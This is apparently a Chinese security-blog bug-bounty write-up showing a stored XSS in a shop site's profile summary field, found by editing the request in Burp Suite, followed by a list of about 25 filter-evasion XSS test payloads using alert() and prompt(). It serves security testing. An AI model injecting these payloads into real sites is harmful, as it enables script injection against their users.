#  【赏金猎人】商店留言板xss漏洞   
原创 Fighter  重生者安全   2024-02-21 00:56  
  
使  
用谷歌登  
录网站  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkwWicVNyeLBOBiaV9y4euSibohCvyAk3QmGhTkiceLoJ47DRryhGd1zxib0mKLMW1k2KJjXVf0Qic0y3dA/640?wx_fmt=png&from=appmsg "")  
  
来到个人页面的总结概况，burpsuite打开拦截，在这个添加概要的框框中，随意输入信息，点击save保存。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkwWicVNyeLBOBiaV9y4euSiboiaM6lBgj3BSmS0GPtb8ASicJl9xiaT7BpiaOmQoVzeuE1v3bdUlxMxP4HQ/640?wx_fmt=png&from=appmsg "")  
  
拦截输入中的 参数存在xss漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkwWicVNyeLBOBiaV9y4euSiboypZw8tIj2no2yoRp2z96WnNM2cIwdA2ScoGBdqvSUibyD2AiaUx4farg/640?wx_fmt=png&from=appmsg "")  
  
将summary参数的类容改成xss payload：<iframe src=javascript:prompt(1)></iframe>  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkwWicVNyeLBOBiaV9y4euSibovHDcupFHfDZww0Z8w5zD9vub5Uo6G2NADW8cHqCsJJQnicHedgPsIzA/640?wx_fmt=png&from=appmsg "")  
  
放开数据包后成功弹窗  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkwWicVNyeLBOBiaV9y4euSibo5YqyqaejRzdECItuWQU3OreqyJo5VkyUosHZ0Ll2Kk7gcHHrRrH22g/640?wx_fmt=png&from=appmsg "")  
  
测试XSS常用payload：  
```

'`"><\x3Cscript>javascript:alert(8)</script>
'`"><\x00script>javascript:alert(9)</script>
<img src=10 href=10 onerror="javascript:alert(10)"></img>
<object src=15 href=15 onerror="javascript:alert(15)"></object>
<script src=16 href=16 onerror="javascript:alert(16)"></script>
<svg onResize svg onResize="javascript:javascript:alert(17)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(18)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(19)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(20)"></body onMouseEnter>
<a href="javas\x06cript:javascript:alert(101)" id="fuzzelement101">test</a>
<a href="javas\x0Ccript:javascript:alert(102)" id="fuzzelement102">test</a>
<script>/* *\x2A/javascript:alert(103)// */</script>
<script>/* *\x00/javascript:alert(104)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(105)//></style>
<script>if("x\\xE112\x96\x89".length==2) { javascript:alert(112);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(113);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(114);}</script>
'`"><\x3Cscript>javascript:alert(115)</script>
'`"><\x00script>javascript:alert(116)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(117)>
"'`><\x00img src=xxx:x onerror=javascript:alert(118)>
<script src="data:text/plain\x2Cjavascript:alert(119)"></script>
<script src="data:\xCB\x8F,javascript:alert(122)"></script>
<script\x0Ctype="text/javascript">javascript:alert(127);</script>
<script\x2Ftype="text/javascript">javascript:alert(128);</script>
```  
  
  
喜欢朋友可以点点赞转发转发![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Social.png "")  
  
  
**免责声明：本公众号不承担任何由于传播、利用本公众号所发布内容而造成的任何后果及法律责任。****未经许可，不得转载。******  
  
